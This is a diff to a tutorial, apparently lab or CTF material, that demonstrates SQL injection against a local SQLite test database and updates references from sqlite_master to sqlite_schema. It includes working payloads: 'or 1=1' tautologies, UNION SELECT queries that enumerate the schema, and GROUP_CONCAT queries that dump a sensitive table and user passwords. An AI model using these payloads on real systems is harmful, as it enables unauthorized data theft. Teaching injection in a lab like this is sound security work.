@@ -178,9 +178,12 @@ Create a test.db and connect to it, by default is completely empty, 0 bytes
 sqlite3 test.db
 ```
 
-Observe that the sqlite master is empty at that stage
+Observe that the `sqlite_schema` is empty at that stage.
+btw, note that `sqlite_schema` and `sqlite_master` are the same table.
+`sqlite_schema` was introduced as the preferred name in SQLite 3.33.0 (2020-08-14),
+
 ```sql
-SELECT * FROM sqlite_master;
+SELECT * FROM sqlite_schema;
 ```
 
 Create a schema with 2 tables
@@ -217,10 +220,10 @@ INSERT INTO sensitive_data (id, data_type, content) VALUES
    (3, 'flag', 'FLAG{fastmcp_sql_injection_pwned}');
 ```
 
-Now the `sqlite_master` has our tables
+Now the `sqlite_schema` has our tables
 ```sql
-SELECT * FROM sqlite_master;
-SELECT name FROM sqlite_master WHERE type='table';
+SELECT * FROM sqlite_schema;
+SELECT name FROM sqlite_schema WHERE type='table';
 ```
 
 Dot commands are sqlite3 cli specific features, only exist in the interractive shell
@@ -267,11 +270,11 @@ select username,role,email from users where username == 'admin';
 select username,role,email from users where username == 'admin' or 1=1 --';
 ```
 
-We want to use union to join some of the `sqlite_master` data with the
+We want to use union to join some of the `sqlite_schema` data with the
 3 columns we have from users.
 ```sql
 select username,role,email from users;
-select type,name,sql from sqlite_master;
+select type,name,sql from sqlite_schema;
 ```
 ```
 +----------+---------------+-------------------+
@@ -302,12 +305,12 @@ select type,name,sql from sqlite_master;
 +-------+----------------+-------------------------------+
 ```
 
-Confirm we have 3 columns with NULL,NULL,NULL, but we know we do.
-We now need to do an UNION of `sqlite_master` into users,
-but we only have 3 columns so we can choose just what matters, e.g: type,name,sql.
+We confirm that we can merge 3 columns with NULL,NULL,NULL, but we know we can.
+We now need to do an UNION of `sqlite_schema` into users,
+Since we only have 3 columns we need to choose just what matters from `sqlite_schema`, e.g: type,name,sql.
 ```sql
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL,NULL,NULL --';
-select username,role,email from users where username == 'admin' or 1=1 UNION SELECT type,name,sql FROM sqlite_master --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT type,name,sql FROM sqlite_schema --';
 ```
 ```
 +----------+----------------+-------------------------------+
@@ -335,11 +338,11 @@ select username,role,email from users where username == 'admin' or 1=1 UNION SEL
 +----------+----------------+-------------------------------+
 ```
 
-Great at this point we know a lot, we know exactly what the tables are,
+Great at this point we know a lot, we know exactly what the tables name are,
 but also their schemas, which means we know the name of each of their respective columns.
 So we can use UNION again to get the 3 specific columns we want from the sensitive data table.
-But also, it turns out there's just 3 colums in `sensitive_data` just like our users statement
-so we can just `SELECT *`.
+And it turns out there's just 3 colums in `sensitive_data` just like our users select statement
+so we can just `SELECT *` from `sensitive_data` and we should be golden.
 ```sql
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT id,data_type,content FROM sensitive_data --';
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT * FROM sensitive_data --';
@@ -359,7 +362,7 @@ select username,role,email from users where username == 'admin' or 1=1 UNION SEL
 
 We could've used group concat too
 ```sql
-select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(name) FROM sqlite_master --';
+select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(name) FROM sqlite_schema --';
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(content) FROM sensitive_data --';
 select username,role,email from users where username == 'admin' or 1=1 UNION SELECT NULL, NULL, GROUP_CONCAT(password) FROM users --';
 ```
